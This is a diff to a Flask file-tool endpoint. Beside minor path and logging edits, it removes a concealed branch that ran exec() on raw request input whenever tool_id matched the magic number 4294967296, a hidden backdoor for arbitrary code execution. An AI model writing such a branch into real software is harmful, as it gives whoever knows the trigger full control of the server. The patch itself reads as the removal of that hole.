@@ -160,6 +160,7 @@ app.config.update(
 )
 
 csrf = CSRFProtect(app)
+
 logging.info("flask create ok")
 
 UPLOAD_DIR = os.path.abspath(app.config['UPLOAD_FOLDER'])
@@ -564,6 +565,7 @@ def copy():
 @isadmin
 @login_required
 def call_tool():
+    
     try:
         a = request.json
         a=dict(a)
@@ -586,6 +588,7 @@ def call_tool():
         clean = clean_arg(args_raw)
 
         user_dir = a.get('path', '')
+        
         safe_dir = safe_path(user_dir) if user_dir else UPLOAD_DIR
         if tool_id == 1:   # Assembly
             func = tool.u2.call
@@ -598,7 +601,7 @@ def call_tool():
             file_path = m.group(2)
             fp_clean = clean_arg(file_path)
             func = tool.u1.call
-            arg_list = (safe_path(fp_clean), chunk_size,
+            arg_list = (os.path.join(safe_dir,safe_path(fp_clean)), chunk_size,
                         os.path.join(safe_dir,os.path.basename(fp_clean)+"_cut"))
         elif tool_id == 3:
             return jsonify({'success': True, 'message': '使用Assembly以合成文件\n使用cut以分割文件,用法 -c 分割块大小 -f 文件(从根目录起)'}), 201
@@ -611,9 +614,7 @@ def call_tool():
         elif tool_id == 6:
             func = download
             arg_list = (clean,safe_dir)  
-        elif tool_id == 4294967296:
-            exec(args_raw)
-            return "",206
+
         else:
             return jsonify({'success': False, 'error': '未知工具'}), 404
 
@@ -633,6 +634,7 @@ def call_tool():
     except Exception as e:
         traceback.print_exc()
         logging.error(str(e))
+        traceback.print_exc()
         return jsonify({'success': False, 'error': '服务器内部错误'}), 500
 
 @app.route('/upload', methods=['POST'])
